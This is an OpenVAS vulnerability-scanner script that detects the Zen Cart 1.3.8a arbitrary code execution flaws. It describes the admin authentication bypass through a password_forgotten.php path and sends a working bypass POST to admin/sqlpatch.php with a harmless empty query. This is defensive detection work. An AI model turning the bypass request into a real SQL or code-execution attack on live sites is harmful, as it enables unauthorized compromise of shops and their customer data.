###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zencart_code_exec_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# Zen Cart Arbitrary Code Execution Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote attacker to execute SQL commands
  or arbitrary code by uploading a .php file, and compromise the application,
  or exploit latent vulnerabilities in the underlying database.
  Impact Level: Application";
tag_affected = "Zen Cart version 1.3.8a and prior";
tag_insight = "- Error in admin/sqlpatch.php file due to lack of sanitisation of the input
    query sting passed into the 'query_string' parameter in an execute action
    in conjunction with a PATH_INFO of password_forgotten.php file.
  - Access to admin/record_company.php is not restricted and can be exploited
    via the record_company_image parameter in conjunction with a PATH_INFO of
    password_forgotten.php, then accessing this file via a direct request to
    the file in images/.";
tag_solution = "Apply security patch from below link,
  http://www.zen-cart.com/forum/attachment.php?attachmentid=5965";
tag_summary = "The host is running Zen Cart and is prone to Arbitrary Code
  Execution vulnerability.";

if(description)
{
  script_id(800820);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-07-03 15:23:01 +0200 (Fri, 03 Jul 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-2254", "CVE-2009-2255");
  script_bugtraq_id(35467, 35468);
  script_name("Zen Cart Arbitrary Code Execution Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35550");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9004");
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/9005");
  script_xref(name : "URL" , value : "http://www.zen-cart.com/forum/showthread.php?t=130161");

  script_description(desc);
  script_summary("Check for the Attack of Zen Cart");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

zencartPort = get_http_port(default:80);
if(!zencartPort){
  zencartPort = 80;
}

if(!get_port_state(zencartPort)){
  exit(0);
}

foreach dir (make_list ("/", "/zencart", "/cart", cgi_dirs()))
{
  sndReq = http_get(item:dir + "/admin/login.php", port:zencartPort);
  rcvRes = http_send_recv(data:sndReq, port:zencartPort);

  if(rcvRes =~ "<title>Zen Cart!</title>" && (!safe_checks()) &&
     egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes))
  {
    postdata = string('query_string=;');
    req = string(
     "POST /", dir, "/admin/sqlpatch.php/password_forgotten.php?" +
                    "action=execute HTTP/1.1\r\n",
     "Host: ", get_host_name(), "\r\n",
     "Content-Type: application/x-www-form-urlencoded\r\n",
     "Content-Length: ", strlen(postdata), "\r\n",
     "\r\n",
     postdata
  );
  res = http_send_recv(port:zencartPort, data:req, bodyonly:TRUE);

   if("1 statements processed" >< res)
   {
     security_hole(zencartPort);
     exit(0);
    }
  }
}
